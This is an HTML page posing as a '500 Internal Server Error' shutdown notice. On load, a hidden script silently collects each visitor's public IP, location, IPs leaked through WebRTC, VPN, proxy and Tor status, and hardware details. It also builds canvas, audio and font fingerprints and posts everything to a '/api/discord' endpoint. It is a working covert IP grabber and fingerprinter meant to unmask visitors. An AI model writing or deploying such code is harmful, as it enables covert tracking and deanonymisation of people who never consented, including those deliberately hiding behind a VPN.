<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        body { 
            background-color: #fff; 
            color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .error-container { 
            text-align: center; 
        }
        h1 { 
            font-size: 24px; 
            font-weight: 500; 
            margin-bottom: 8px; 
        }
        p { 
            font-size: 14px; 
            color: #666; 
            margin: 0; 
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>Website has shut down</h1>
        <p>Internal Server Error (Code: 500)</p>
    </div>

    <script>
        // WebRTC IP leak detection
        async function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || 
                                        window.mozRTCPeerConnection || 
                                        window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve([]);
                    return;
                }

                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{urls: "stun:stun.l.google.com:19302"}]
                    });

                    pc.createDataChannel("");
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            return;
                        }
                        
                        const candidateStr = ice.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                        const match = candidateStr.match(ipRegex);
                        
                        if (match && match[1]) {
                            const ip = match[1];
                            if (!ips.includes(ip) && 
                                ip !== '0.0.0.0' && 
                                !ip.startsWith('127.') &&
                                ip !== '::1') {
                                ips.push(ip);
                            }
                        }
                    };

                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(() => {});

                    setTimeout(() => {
                        try {
                            pc.close();
                        } catch(e) {}
                        resolve(ips);
                    }, 3000);
                } catch(e) {
                    resolve([]);
                }
            });
        }

        // Check if IP is likely a VPN/proxy
        async function checkVPNStatus(ip) {
            const checks = {
                isVPN: "Checking...",
                isProxy: "Checking...",
                isHosting: "Checking...",
                isTor: "Checking...",
                risk: "Unknown"
            };

            if (!ip || ip === "Unknown") {
                checks.isVPN = "Unknown";
                checks.isProxy = "Unknown";
                checks.isHosting = "Unknown";
                checks.isTor = "Unknown";
                return checks;
            }

            try {
                // IPQualityScore free API
                const response = await fetch(`https://www.ipqualityscore.com/api/json/ip/FREE_API_KEY/${ip}?strictness=0&allow_public_access_points=true&fast=true&lighter_penalties=true&mobile=true`);
                if (response.ok) {
                    const data = await response.json();
                    checks.isVPN = data.vpn ? "Yes" : "No";
                    checks.isProxy = data.proxy ? "Yes" : "No";
                    checks.isTor = data.tor ? "Yes" : "No";
                    checks.risk = data.fraud_score ? data.fraud_score + "/100" : "Unknown";
                    return checks;
                }
            } catch(e) {}

            try {
                // ProxyCheck.io API (free tier)
                const response2 = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
                if (response2.ok) {
                    const data2 = await response2.json();
                    if (data2[ip]) {
                        checks.isProxy = data2[ip].proxy === "yes" ? "Yes" : "No";
                        checks.isVPN = data2[ip].type === "VPN" ? "Yes" : "No";
                        checks.risk = data2[ip].risk || "Unknown";
                    }
                    return checks;
                }
            } catch(e2) {}

            try {
                // IPHub API (fallback)
                const response3 = await fetch(`http://v2.api.iphub.info/ip/${ip}`);
                if (response3.ok) {
                    const data3 = await response3.json();
                    // 0 = Residential/Business, 1 = Non-residential (hosting/proxy), 2 = Non-residential & residential
                    checks.isHosting = (data3.block === 1 || data3.block === 2) ? "Yes" : "No";
                    checks.isVPN = (data3.block === 1 || data3.block === 2) ? "Likely" : "No";
                }
            } catch(e3) {}

            // If all APIs failed
            if (checks.isVPN === "Checking...") {
                checks.isVPN = "Unable to verify";
                checks.isProxy = "Unable to verify";
                checks.isHosting = "Unable to verify";
                checks.isTor = "Unable to verify";
            }

            return checks;
        }

        // Timezone mismatch detection
        function detectTimezoneMismatch(ipCountry, ipTimezone, browserTimezone) {
            if (!ipTimezone || ipTimezone === "Unknown") return "Unable to verify";
            
            // Normalize timezone strings
            const normalizeTimezone = (tz) => tz.replace(/\s+/g, '_').replace(/\//g, '_').toLowerCase();
            
            const ipTzNorm = normalizeTimezone(ipTimezone);
            const browserTzNorm = normalizeTimezone(browserTimezone);
            
            // Direct match
            if (ipTzNorm === browserTzNorm) {
                return "‚úì Match";
            }
            
            // Check if timezones are in same country
            if (ipCountry && browserTimezone.includes(ipCountry)) {
                return "‚úì Same country";
            }
            
            return "‚ö†Ô∏è MISMATCH (Possible VPN)";
        }

        // gather system info
        async function collectInfo() {
            let data = {};
            
            // try multiple IP APIs in case one fails
            const apis = [
                "https://ipapi.co/json/",
                "https://ipwho.is/"
            ];

            for(let i = 0; i < apis.length; i++) {
                try {
                    const response = await fetch(apis[i]);
                    if(response.ok) {
                        const json = await response.json();
                        data = Object.assign(data, json);
                        if(data.ip || data.query) break;
                    }
                } catch(err) {
                    // silent fail, try next API
                }
            }

            const ip = data.ip || "Unknown";
            
            // Get WebRTC IPs (takes 3 seconds)
            const webrtcIPs = await getWebRTCIPs();
            
            // Check VPN status
            const vpnStatus = await checkVPNStatus(ip);
            
            // Detect timezone mismatch
            const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const ipTimezone = data.timezone || "Unknown";
            const ipCountry = data.country_code || data.country || "";
            const timezoneMismatch = detectTimezoneMismatch(ipCountry, ipTimezone, browserTimezone);

            // Detect if WebRTC leaked different IP
            let ipMismatch = "No";
            if (webrtcIPs.length > 0) {
                // Check if any WebRTC IP is different from public IP
                const hasLocalIP = webrtcIPs.some(wip => 
                    wip.startsWith('10.') || 
                    wip.startsWith('192.168.') || 
                    wip.startsWith('172.') ||
                    wip.includes(':')
                );
                const hasPublicIP = webrtcIPs.some(wip => wip === ip);
                
                if (!hasPublicIP && webrtcIPs.length > 0) {
                    ipMismatch = "‚ö†Ô∏è YES (WebRTC leak detected)";
                } else if (hasLocalIP) {
                    ipMismatch = "Local IP exposed";
                }
            }

            // GPU detection
            let gpuInfo = "Unknown";
            let webglVendor = "Unknown";
            let webglRenderer = "Unknown";
            let maxTextureSize = "Unknown";
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if(gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if(debugInfo) {
                        webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        gpuInfo = webglRenderer;
                    }
                    maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
                }
            } catch(e) {}

            // Battery info
            let batteryLevel = "Unknown";
            let chargingStatus = "Unknown";
            let batteryTime = "Unknown";
            try {
                const battery = await navigator.getBattery();
                batteryLevel = Math.round(battery.level * 100) + "%";
                chargingStatus = battery.charging ? "Charging" : "Not Charging";
                if (battery.charging && battery.chargingTime !== Infinity) {
                    batteryTime = Math.round(battery.chargingTime / 60) + " min to full";
                } else if (!battery.charging && battery.dischargingTime !== Infinity) {
                    batteryTime = Math.round(battery.dischargingTime / 60) + " min remaining";
                }
            } catch(e) {}

            // Storage estimate
            let storageQuota = "Unknown";
            let storageUsage = "Unknown";
            let storagePercent = "Unknown";
            try {
                const estimate = await navigator.storage.estimate();
                storageQuota = (estimate.quota / 1024 / 1024 / 1024).toFixed(2) + " GB";
                storageUsage = (estimate.usage / 1024 / 1024).toFixed(2) + " MB";
                storagePercent = ((estimate.usage / estimate.quota) * 100).toFixed(2) + "%";
            } catch(e) {}

            // Connection info
            let connectionType = "Unknown";
            let effectiveType = "Unknown";
            let downlink = "Unknown";
            let rtt = "Unknown";
            let saveData = "Unknown";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if(conn) {
                    connectionType = conn.type || "Unknown";
                    effectiveType = conn.effectiveType || "Unknown";
                    downlink = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
                    rtt = conn.rtt ? conn.rtt + " ms" : "Unknown";
                    saveData = conn.saveData ? "Enabled" : "Disabled";
                }
            } catch(e) {}

            // Canvas fingerprint
            let canvasFingerprint = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Browser Fingerprint üîç', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas Test', 4, 17);
                const dataURL = canvas.toDataURL();
                // Create hash of canvas data
                let hash = 0;
                for (let i = 0; i < dataURL.length; i++) {
                    const char = dataURL.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                canvasFingerprint = "Hash: " + Math.abs(hash).toString(16).substring(0, 12);
            } catch(e) {}

            // Audio context fingerprint
            let audioFingerprint = "Unknown";
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    const context = new AudioContext();
                    const oscillator = context.createOscillator();
                    const analyser = context.createAnalyser();
                    const gainNode = context.createGain();
                    const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                    
                    gainNode.gain.value = 0;
                    oscillator.type = 'triangle';
                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gainNode);
                    gainNode.connect(context.destination);
                    
                    audioFingerprint = `${analyser.frequencyBinCount}-${context.sampleRate}Hz-${context.destination.maxChannelCount}ch`;
                    
                    oscillator.disconnect();
                    analyser.disconnect();
                    scriptProcessor.disconnect();
                    gainNode.disconnect();
                    context.close();
                }
            } catch(e) {}

            // Performance memory (Chrome only)
            let memoryUsage = "Not available";
            let memoryLimit = "Not available";
            try {
                if(performance.memory) {
                    memoryUsage = (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2) + " MB";
                    memoryLimit = (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2) + " MB";
                }
            } catch(e) {}

            // Font detection
            let detectedFonts = [];
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Verdana', 'Courier New', 'Georgia', 'Times New Roman',
                'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Lucida Console',
                'Palatino', 'Garamond', 'Bookman', 'Courier', 'Helvetica',
                'Monaco', 'Consolas', 'Calibri', 'Cambria', 'Tahoma', 'MS Sans Serif'
            ];
            
            try {
                const testString = "mmmmmmmmmmlli";
                const testSize = '72px';
                
                const fontCanvas = document.createElement('canvas');
                const fontContext = fontCanvas.getContext('2d');
                
                const baseFontWidths = {};
                for(let baseFont of baseFonts) {
                    fontContext.font = testSize + ' ' + baseFont;
                    baseFontWidths[baseFont] = fontContext.measureText(testString).width;
                }
                
                for(let testFont of testFonts) {
                    let detected = false;
                    for(let baseFont of baseFonts) {
                        fontContext.font = testSize + ' "' + testFont + '", ' + baseFont;
                        const width = fontContext.measureText(testString).width;
                        if(width !== baseFontWidths[baseFont]) {
                            detected = true;
                            break;
                        }
                    }
                    if(detected) {
                        detectedFonts.push(testFont);
                    }
                }
            } catch(e) {}

            // Build location string
            let location = "Unknown";
            if(data.city) {
                const region = data.region || data.region_name || "";
                const country = data.country_name || data.country || "";
                location = [data.city, region, country].filter(x => x).join(", ");
            }
            
            const isp = data.org || data.isp || (data.connection && data.connection.isp) || "Unknown";

            const info = {
                "--- VPN/PROXY DETECTION ---": "",
                "Public IP": ip,
                "WebRTC Leaked IPs": webrtcIPs.length > 0 ? webrtcIPs.join(", ") : "None detected",
                "IP Mismatch": ipMismatch,
                "VPN Detected": vpnStatus.isVPN,
                "Proxy Detected": vpnStatus.isProxy,
                "Hosting/Datacenter": vpnStatus.isHosting,
                "Tor Network": vpnStatus.isTor,
                "Risk Score": vpnStatus.risk,
                "Timezone Check": timezoneMismatch,
                "IP Timezone": ipTimezone,
                "Browser Timezone": browserTimezone,
                "--- NETWORK DATA ---": "",
                "IP Address": ip,
                "Location": location,
                "ISP": isp,
                "ASN": data.asn || "Unknown",
                "Hostname": data.hostname || data.reverse || "None",
                "Connection Type": connectionType,
                "Network Quality": effectiveType,
                "Downlink Speed": downlink,
                "Round Trip Time": rtt,
                "Data Saver Mode": saveData,
                "--- DEVICE HARDWARE ---": "",
                "Operating System": navigator.platform,
                "User Agent": navigator.userAgent,
                "CPU Cores": navigator.hardwareConcurrency || "Unknown",
                "Device Memory": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
                "GPU Vendor": webglVendor,
                "GPU Renderer": gpuInfo,
                "Max Texture Size": maxTextureSize,
                "Screen Resolution": screen.width + "x" + screen.height,
                "Available Screen": screen.availWidth + "x" + screen.availHeight,
                "Window Size": window.innerWidth + "x" + window.innerHeight,
                "Device Pixel Ratio": window.devicePixelRatio,
                "Color Depth": screen.colorDepth + " bits",
                "Pixel Depth": screen.pixelDepth + " bits",
                "Orientation": screen.orientation ? screen.orientation.type : "Unknown",
                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes (" + navigator.maxTouchPoints + " points)" : "No",
                "Battery Level": batteryLevel,
                "Charging Status": chargingStatus,
                "Battery Time": batteryTime,
                "--- STORAGE ---": "",
                "Storage Quota": storageQuota,
                "Storage Used": storageUsage,
                "Storage Percent": storagePercent,
                "--- BROWSER/SOFTWARE ---": "",
                "Browser Name": navigator.appName,
                "Browser Version": navigator.appVersion,
                "Browser Platform": navigator.platform,
                "Browser Product": navigator.product,
                "Browser Vendor": navigator.vendor,
                "Browser Language": navigator.language,
                "System Languages": navigator.languages.join(", "),
                "Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
                "Do Not Track": navigator.doNotTrack || "Not set",
                "Java Enabled": navigator.javaEnabled ? navigator.javaEnabled() : false,
                "Online Status": navigator.onLine ? "Online" : "Offline",
                "PDF Viewer": navigator.pdfViewerEnabled ? "Enabled" : "Disabled",
                "Timezone Offset": new Date().getTimezoneOffset() + " minutes from UTC",
                "Local Time": new Date().toLocaleString(),
                "Referrer URL": document.referrer || "Direct Visit",
                "--- PERFORMANCE ---": "",
                "JS Heap Used": memoryUsage,
                "JS Heap Limit": memoryLimit,
                "--- FINGERPRINTS ---": "",
                "Canvas Fingerprint": canvasFingerprint,
                "Audio Fingerprint": audioFingerprint,
                "Detected Fonts": detectedFonts.join(", ") || "None detected",
                "Font Count": detectedFonts.length
            };

            let message = "";
            for(let key in info) {
                if(key.startsWith("---")) {
                    message += "\n" + key + "\n";
                } else {
                    message += key + ": " + info[key] + "\n";
                }
            }

            // send to backend
            fetch("/api/discord", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({content: "```\n" + message + "\n```"})
            }).catch(function(err) {
                // ignore errors
            });
        }

        collectInfo();
    </script>
</body>
</html>
